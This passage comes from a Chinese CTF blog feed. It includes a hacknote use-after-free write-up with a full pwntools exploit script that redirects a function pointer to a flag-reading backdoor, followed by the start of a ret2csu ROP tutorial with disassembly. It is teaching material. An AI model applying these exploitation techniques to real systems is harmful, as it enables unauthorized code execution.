class=\"line\">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class=\"line\">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br><span class=\"line\">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class=\"line\">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class=\"line\">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现这里被输入的字符给占了，再去读一下这个 0x804b1c8：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30xg 0x804b1c8</span></span><br><span class=\"line\">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里没有啥变化，依旧是指向输出函数的地址，以及指向某字符串的地址，0x804b198 这个地址的 chunk 之前编号为 0，因为地址更低，更先被分配，这个地址更高的作为编号 1，同时整个程序存在 backdoor：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">magic</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t所以只需要通过两次释放之后，再申请一个 0x8 之类比较小的，保证能够写入地址同时能够让分配到的 chunk 为同一个即可，然后申请的时候发送的数据为后门函数的地址即可，之后输出的时候它会自动调用后门程序：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./hacknote&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addnote</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">printnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">20</span>, <span class=\"string\">&quot;note1&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">30</span>, <span class=\"string\">&quot;note2&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>, p32(magic)) <span class=\"comment\"># add note 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>) <span class=\"comment\"># print note 0</span></span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#[*] Switching to interactive mode</span></span><br><span class=\"line\"><span class=\"comment\">#flag&#123;asd32as1-1d8g1r1hj5g4d4-9d54h3jyur4nfke1a&#125;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/c8624158.html",
            "url": "http://blog.g01den.top/posts/c8624158.html",
            "title": "pwn学习笔记（9）-中级ROP--ret2csu",
            "date_published": "2024-08-08T18:55:43.000Z",
            "content_html": "<h1 id=\"pwn学习笔记9-中级ropret2csu\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记9-中级ropret2csu\">#</a> pwn 学习笔记（9）- 中级 ROP–ret2csu</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<p>​\t\t首先是 64 位文件的传参方式：前六个参数是从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9，之后的通过栈传参。</p>\n<p>​\t\t比如：</p>\n<blockquote>\n<p>传参函数大于 7 个：</p>\n<p>H(a,b,c,d,e,f,g,h)</p>\n<p>a-&gt;%rdi、b-&gt;%rsi、c-&gt;%rdx、d-&gt;%rcx、e-&gt;%r8、f-&gt;%r9</p>\n<p>h-&gt;(%esp)</p>\n<p>g-&gt;(%esp)</p>\n<p>call H</p>\n</blockquote>\n<p>​\t\t先看看如下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdio.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">H</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b,<span class=\"type\">int</span> c,<span class=\"type\">int</span> d,<span class=\"type\">int</span> e,<span class=\"type\">int</span> f,<span class=\"type\">int</span> g,<span class=\"type\">int</span> h)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a = <span class=\"number\">1</span>,b = <span class=\"number\">2</span>,c = <span class=\"number\">3</span>,d = <span class=\"number\">4</span>,e = <span class=\"number\">5</span>,f = <span class=\"number\">6</span>,g = <span class=\"number\">7</span>,h = <span class=\"number\">8</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>,H(a,b,c,d,e,f,g,h));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">H</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b,<span class=\"type\">int</span> c,<span class=\"type\">int</span> d,<span class=\"type\">int</span> e,<span class=\"type\">int</span> f,<span class=\"type\">int</span> g,<span class=\"type\">int</span> h)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a+b+c+d+e+f+g+h;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后反汇编一下 main 函数和 H 函数的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000001149 &lt;main&gt;:</span><br><span class=\"line\">    1149:       f3 0f 1e fa             endbr64</span><br><span class=\"line\">    114d:       55                      push   rbp</span><br><span class=\"line\">    114e:       48 89 e5                mov    rbp,rsp</span><br><span class=\"line\">    1151:       48 83 ec 20             sub    rsp,0x20</span><br><span class=\"line\">    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1</span><br><span class=\"line\">    115c:       c7 45 e4 02 00 00 00    mov    DWORD PTR [rbp-0x1c],0x2</span><br><span class=\"line\">    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3</span><br><span class=\"line\">    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4</span><br><span class=\"line\">    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5</span><br><span class=\"line\">    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6</span><br><span class=\"line\">    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7</span><br><span class=\"line\">    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8</span><br><span class=\"line\">    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]</span><br><span class=\"line\">    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]</span><br><span class=\"line\">    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]</span><br><span class=\"line\">    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]</span><br><span class=\"line\">    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]</span><br><span class=\"line\">    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]</span><br><span class=\"line\">    11a1:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]</span><br><span class=\"line\">    11a4:       57                      push   rdi</span><br><span class=\"line\">    11a5:       8b 7d f8                mov    edi,DWORD PTR [rbp-0x8]</span><br><span class=\"line\">    11a8:       57                      push   rdi</span><br><span class=\"line\">    11a9:       89 c7                   mov    edi,eax</span><br><span class=\"line\">    11ab:       e8 1e 00 00 00          call   11ce &lt;H&gt;</span><br><span class=\"line\">    11b0:       48 83 c4 10             add    rsp,0x10</span><br><span class=\"line\">    11b4:       89 c6                   mov    esi,eax</span><br><span class=\"line\">    11b6:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class=\"line\">    11bd:       b8 00 00 00 00          mov    eax,0x0</span><br><span class=\"line\">    11c2:       e8 89 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class=\"line\">    11c7:       b8 00 00 00 00          mov    eax,0x0</span><br><span class=\"line\">    11cc:       c9                      leave</span><br><span class=\"line\">    11cd:       c3                      ret</span><br><span class=\"line\"></span><br><span class=\"line\">00000000000011ce &lt;H&gt;:</span><br><span class=\"line\">    11ce:       f3 0f 1e fa             endbr64</span><br><span class=\"line\">    11d2:       55                      push   rbp</span><br><span class=\"line\">    11d3:       48 89 e5                mov    rbp,rsp</span><br><span class=\"line\">    11d6:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi</span><br><span class=\"line\">    11d9:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi</span><br><span class=\"line\">    11dc:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx</span><br><span class=\"line\">    11df:       89 4d f0                mov    DWORD PTR [rbp-0x10],ecx</span><br><span class=\"line\">    11e2:       44 89 45 ec             mov    DWORD PTR [rbp-0x14],r8d</span><br><span class=\"line\">    11e6:       44 89 4d e8             mov    DWORD PTR [rbp-0x18],r9d</span><br><span class=\"line\">    11ea:       8b 55 fc                mov    edx,DWORD PTR [rbp-0x4]</span><br><span class=\"line\">    11ed:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]</span><br><span class=\"line\">    11f0:       01 c2                   add    edx,eax</span><br><span class=\"line\">    11f2:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]</span><br><span class=\"line\">    11f5:       01 c2                   add    edx,eax</span><br><span class=\"line\">    11f7:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]</span><br><span class=\"line\">    11fa:       01 c2                   add    edx,eax</span><br><span class=\"line\">    11fc:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class=\"line\">    11ff:       01 c2                   add    edx,eax</span><br><span class=\"line\">    1201:       8b 45 e8                mov    eax,DWORD PTR [rbp-0x18]</span><br><span class=\"line\">    1204:       01 c2                   add    edx,eax</span><br><span class=\"line\">    1206:       8b 45 10                mov    eax,DWORD PTR [rbp+0x10]</span><br><span class=\"line\">    1209:       01 c2                   add    edx,eax</span><br><span class=\"line\">    120b:       8b 45 18                mov    eax,DWORD PTR [rbp+0x18]</span><br><span class=\"line\">    120e:       01 d0                   add    eax,edx</span><br><span class=\"line\">    1210:       5d                      pop    rbp</span><br><span class=\"line\">    1211:       c3                      ret</span><br></pre></td></tr></table></figure>\n<p>​\t\t很明显的就是前六个参数是寄存器传参，剩下两个就是栈传参。</p>\n<h2 id=\"libc_csu_init函数基础\"><a class=\"markdownIt-Anchor\" href=\"#libc_csu_init函数基础\">#</a>  <code>libc_csu_init</code>  函数基础：</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000001220</span><br><span class=\"line\">.text:0000000000001220 ; =============== S U B R O U T I N E =======================================</span><br><span class=\"line\">.text:0000000000001220</span><br><span class=\"line\">.text:0000000000001220</span><br><span class=\"line\">.text:0000000000001220 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:0000000000001220                 public __libc_csu_init</span><br><span class=\"line\">.text:0000000000001220 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o</span><br><span class=\"line\">.text:0000000000001220 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000001220                 endbr64</span><br><span class=\"line\">.text:0000000000001224                 push    r15</span><br><span class=\"line\">.text:0000000000001226                 lea     r15, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:000000000000122D                 push    r14</span><br><span class=\"line\">.text:000000000000122F                 mov     r14, rdx</span><br><span class=\"line\">.text:0000000000001232                 push    r13</span><br><span class=\"line\">.text:0000000000001234                 mov     r13, rsi</span><br><span class=\"line\">.text:0000000000001237                 push    r12</span><br><span class=\"line\">.text:0000000000001239                 mov     r12d, edi</span><br><span class=\"line\">.text:000000000000123C                 push    rbp</span><br><span class=\"line\">.text:000000000000123D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:0000000000001244                 push    rbx</span><br><span class=\"line\">.text:0000000000001245                 sub     rbp, r15</span><br><span class=\"line\">.text:0000000000001248                 sub     rsp, 8</span><br><span class=\"line\">.text:000000000000124C                 call    _init_proc</span><br><span class=\"line\">.text:0000000000001251                 sar     rbp, 3</span><br><span class=\"line\">.text:0000000000001255                 jz      short loc_1276</span><br><span class=\"line\">.text:0000000000001257                 xor     ebx, ebx</span><br><span class=\"line\">.text:0000000000001259                 nop     dword ptr [rax+00000000h]</span><br><span class=\"line\">.text:0000000000001260</span><br><span class=\"line\">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class=\"line\">.text:0000000000001260                 mov     rdx, r14</span><br><span class=\"line\">.text:0000000000001263                 mov     rsi, r13</span><br><span class=\"line\">.text:0000000000001266                 mov     edi, r12d</span><br><span class=\"line\">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class=\"line\">.text:000000000000126D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class=\"line\">.text:0000000000001274                 jnz     short loc_1260</span><br><span class=\"line\">.text:0000000000001276</span><br><span class=\"line\">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class=\"line\">.text:0000000000001276                 add     rsp, 8</span><br><span class=\"line\">.text:000000000000127A                 pop     rbx</span><br><span class=\"line\">.text:000000000000127B                 pop     rbp</span><br><span class=\"line\">.text:000000000000127C                 pop     r12</span><br><span class=\"line\">.text:000000000000127E                 pop     r13</span><br><span class=\"line\">.text:0000000000001280                 pop     r14</span><br><span class=\"line\">.text:0000000000001282                 pop     r15</span><br><span class=\"line\">.text:0000000000001284                 retn</span><br><span class=\"line\">.text:0000000000001284 ; &#125; // starts at 1220</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里我们可以利用下面的几个点，上汇编：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class=\"line\">.text:0000000000001276                 add     rsp, 8</span><br><span class=\"line\">.text:000000000000127A                 pop     rbx</span><br><span class=\"line\">.text:000000000000127B                 pop     rbp</span><br><span class=\"line\">.text:000000000000127C                 pop     r12</span><br><span class=\"line\">.text:000000000000127E                 pop     r13</span><br><span class=\"line\">.text:0000000000001280                 pop     r14</span><br><span class=\"line\">.text:0000000000001282                 pop     r15</span><br><span class=\"line\">.text:0000000000001284                 retn</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现了这里可以修改个别寄存器的值，然后是这儿，可以修改传参用的那几个寄存器的值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class=\"line\">.text:0000000000001260                 mov     rdx, r14</span><br><span class=\"line\">.text:0000000000001263                 mov     rsi, r13</span><br><span class=\"line\">.text:0000000000001266                 mov     edi, r12d</span><br><span class=\"line\">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class=\"line\">.text:000000000000126D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class=\"line\">.text:0000000000001274                 jnz     short loc_1260</span><br></pre></td></tr></table></figure>\n<p>​\t\t由此，我们可以通过控制 r13 等和传参用的寄存器相对应的来进行 ret2syscall 等操作。</p>\n<h2 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\">#</a> 例子：</h2>\n<p>​\t\t先看看架构：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/Temp$ checksec pwn</span><br><span class=\"line\">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>​\t\tIDA 分析：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">vulnerable_function</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">128</span>]; <span class=\"comment\">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t然后看看 <code>__libc_csu_init</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0</span><br><span class=\"line\">.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================</span><br><span class=\"line\">.text:00000000004005C0</span><br><span class=\"line\">.text:00000000004005C0</span><br><span class=\"line\">.text:00000000004005C0 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class=\"line\">.text:00000000004005C0 ; __unwind &#123;</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span 